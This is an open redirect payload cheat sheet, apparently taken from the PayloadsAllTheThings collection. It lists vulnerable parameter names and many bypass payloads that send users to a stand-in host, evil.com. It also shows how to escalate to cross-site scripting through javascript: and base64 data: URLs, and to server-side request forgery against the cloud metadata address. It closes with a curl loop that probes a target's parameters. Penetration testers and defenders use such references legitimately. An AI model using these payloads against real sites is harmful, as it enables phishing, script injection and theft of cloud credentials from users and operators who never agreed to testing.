# Open Redirect Payloads

> Source: PayloadsAllTheThings — Open Redirect

## Common Vulnerable Parameters

```
?redirect=
?url=
?next=
?return=
?goto=
?dest=
?destination=
?redir=
?redirect_url=
?return_to=
?checkout_url=
?continue=
?forward=
?target=
```

## URL Parsing Confusion

```
# @ character — browser treats left side as credentials
http://target.com@evil.com/
http://www.target.com@evil.com/

# Query string ambiguity
http://evil.com?http://target.com/
http://target.com?redirect=http://evil.com/

# Path confusion
http://target.com/http://evil.com/
http://target.com/redirect/http://evil.com/

# Folder masquerading
http://evil.com/folder/www.target.com

# Backslash confusion
http://evil.com\@target.com
```

## Protocol-Relative URLs

```
//evil.com
////evil.com
\/\/evil.com/
/\/evil.com/
//evil.com/%2f..
```

### Protocol Tricks

```
https:evil.com          (bypasses // blacklist)
javascript:alert(1)     (XSS escalation)
data:text/html,<script>alert(1)</script>
```

## Unicode Normalization

```
# Unicode character substitution
https://evil.c%E2%84%80.target.com    (U+2100)
http://evil.com%E3%80%82target.com     (U+3002 ideographic period)
http://a.com%EF%BC%8Fx.b.com          (fullwidth slash)

# Homograph attack
https://evil.xn--target-com.com        (punycode)
```

## Null Byte and Special Characters

```
//evil%00.target.com
//evil.com%0d%0a
//evil.com%23.target.com    (# fragment)
//evil.com%3F.target.com    (? query)
```

## Parameter Pollution

```
# Duplicate parameter — second value may win
?next=target.com&next=evil.com

# Array syntax
?next[]=target.com&next[]=evil.com
```

## Whitelist/Domain Bypass

```
# Subdomain matching bypass
https://target.com.evil.com
https://target.com-evil.com
https://evil-target.com

# Adding allowed domain as subdirectory
https://evil.com/target.com

# Combining techniques
https://target.com@evil.com
//target.com%40evil.com
```

## CRLF + Open Redirect

```
/%0d%0aLocation:%20http://evil.com
/redirect?url=%0d%0aLocation:%20http://evil.com
```

## Open Redirect to XSS

```
javascript:alert(document.domain)//
java%0d%0ascript%0d%0a:alert(0)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

## Open Redirect to SSRF

```
# If the server follows redirects server-side
?url=http://evil.com/redirect?to=http://169.254.169.254/latest/meta-data/
```

## Testing Automation

```bash
# Test common parameters with redirect payload
PARAMS="redirect url next return goto dest redir redirect_url return_to"
TARGET="http://target.com"

for p in $PARAMS; do
  CODE=$(run_tool curl -s -o /dev/null -w "%{http_code}" "$TARGET/?$p=https://evil.com")
  LOCATION=$(run_tool curl -s -I "$TARGET/?$p=https://evil.com" | grep -i "location:")
  echo "$p -> $CODE $LOCATION"
done
```
